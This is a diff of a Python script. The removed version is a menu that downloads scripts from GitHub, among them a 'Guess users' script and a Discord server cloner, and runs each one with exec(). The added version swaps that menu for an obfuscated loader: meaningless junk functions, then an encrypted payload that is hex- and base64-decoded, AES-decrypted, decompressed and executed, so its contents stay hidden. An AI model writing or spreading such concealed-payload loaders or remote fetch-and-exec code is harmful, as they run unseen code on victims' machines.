@@ -1,56 +1,37 @@
-import urllib.request
-import sys
-import traceback
 
-def run_code_in_current_window(url, tool_name):
-    print(f"[*] Downloading {tool_name} ...")
-    try:
-        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
-        with urllib.request.urlopen(req, timeout=15) as resp:
-            code = resp.read().decode('utf-8')
-        if not code.strip():
-            print(f"[-] {tool_name} is empty.")
-            input("\nPress Enter to return to menu...")
-            return
-        print(f"[+] Executing {tool_name} ...\n")
-        try:
-            exec(code, globals())
-        except Exception as exec_err:
-            print(f"\n[!] Error while executing {tool_name}:\n{exec_err}")
-            traceback.print_exc()
-        finally:
-            print(f"\n[+] Finished executing {tool_name}.")
-            input("\nPress Enter to return to menu...")
-    except Exception as e:
-        print(f"[-] Failed to load {tool_name}: {e}")
-        input("\nPress Enter to return to menu...")
+import base64, zlib
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import unpad
 
-def main():
-    while True:
-        print("\n" + "=" * 40)
-        print("         TOOL SELECTOR")
-        print("=" * 40)
-        print("[1] Launch Guess users")
-        print("[2] Launch Clone Discord Server")
-        print("[0] Exit")
-        choice = input("\nEnter your choice (1/2/0): ").strip()
+# ========== Junk code ==========
+def hzTYam():
+    YfaJ = 524
+    suoV = SPqu ^ 50
+    return zSsA
 
-        if choice == "1":
-            run_code_in_current_window(
-                "https://raw.githubusercontent.com/IsalmND/test/refs/heads/main/user.py",
-                "Guess users"
-            )
-        elif choice == "2":
-            run_code_in_current_window(
-                "https://raw.githubusercontent.com/IsalmND/test2/refs/heads/main/clone.py",
-                "Clone Discord Server"
-            )
-        elif choice == "0":
-            print("Exiting.")
-            sys.exit(0)
-        else:
-            print("[-] Invalid choice. Please enter 1, 2 or 0.")
-            input("\nPress Enter to continue...")
+def qYAPca():
+    bHPq = 237
+    wlkH = lNJc ^ 250
+    return gBAh
 
-if __name__ == "__main__":
-    main()
+def cUrcCY():
+    lEew = 374
+    dTQY = pTax ^ 40
+    return Jcwu
+
+
+# ========== Main loader ==========
+pwSLcrCjWrmw = "6f394152742f4a4e736b79752b6e777476356f4963444d6576764a6e54756244763358443770672f3658303457764974786335742f2b6261586e4834326133424f6a7a566a574549317a7a45556d4b7a684a4556306557706c7a5a6542683561357a65546f76537a572f4f415242516d724f587237707476737972644777586b4646666d613434335146427171692f6a634d3353497950744c47483347756d56686466504f624b4f57554d444d446a4536722f6b4137636334386f4f6b31304c464c7a643876646f585658655637567574716f6e4c4657597a533732374678305a4d786e443147596f684544686f6e2b7648685155467447392b5755472b4b5231616f554e2b726b422b4866625a7069593277436f6f566647586f4f6a645a36584e7962515775424c7842314b5130724a59617a5a4a456d6c2b634d784145384b6a6457484672636d343259495a587531307a30436d75374c77384335334b55635744384372446977533938764e38587459786730585636617274557a70755043587277696f5769676656692f43562b2b3141526b674e35547a73696a3432786f63384e612b326f77306f67317068676e567a2b4254466549416579516c58665273496f6154466d4c766165475a69715a6c58586f4a4a337934433033446f5770426858627a46315258393144454d374a4f436a732b2b54516866544f7a6277312f42313731706d5436687266476b6573555173374a7961623156636e5253357868752b6943566c464454446c463276524a7a724277384231446f706d5a2f30343276313871646c366643794d494d4a34504e32553553657279446a455a784c6b3474794761394f6671795936592f465278742f395a723170577563493046673350596838346e48455965306b64466f526b4c58554b5734456a62326545692f5432485070306d6d796e7a4a56486f2f4f734d3678694a7366396e77372f582f68664b6a5678463474586146564444745335704f316e7843544d3639776435315379577672774d6f79744d736d66733256594b6c753933564f724144574d73513848592b30486c6f5951507a55514a414f5a35766c6f3657425157385169415470704c6f5143506475616f42534a4743302b366e38465936466b2f494e745a346c6f4a55696f356451486f4d76322b6972324c7144667879704346492b636f4e4d356f6e566875492f4573576d566369416e6342584972416d70354f4a2f4b647a64695367704f4e2b4867364a454f475539707971686d474d3446356f6e6c506357536643426f365241516e7335656375674d456f6f464a57484b7677342b6b48644a744d735357666c7a4467444b4b756177644d61644d587648794d52614435616c4a356f70556c4f553d"
+naybLFKrAk = "6653666d57566671743443666837427677533070464d4633727a5063632f576b72396f72706139654936453d"
+ZyhoYETK = "7a633533426c637352616745436f5a7a2f6874502f413d3d"
+
+jPwzgwZBcx = base64.b64decode(bytes.fromhex(naybLFKrAk).decode())
+iIvtCQAG = base64.b64decode(bytes.fromhex(ZyhoYETK).decode())
+oZPWdegCAcVC = base64.b64decode(bytes.fromhex(pwSLcrCjWrmw).decode())
+
+cipher = AES.new(jPwzgwZBcx, AES.MODE_CBC, iv=iIvtCQAG)
+rKGxdlGZUG = unpad(cipher.decrypt(oZPWdegCAcVC), AES.block_size)
+original_code = zlib.decompress(rKGxdlGZUG)
+
+# Execute in global scope to make imports available
+exec(original_code, globals())
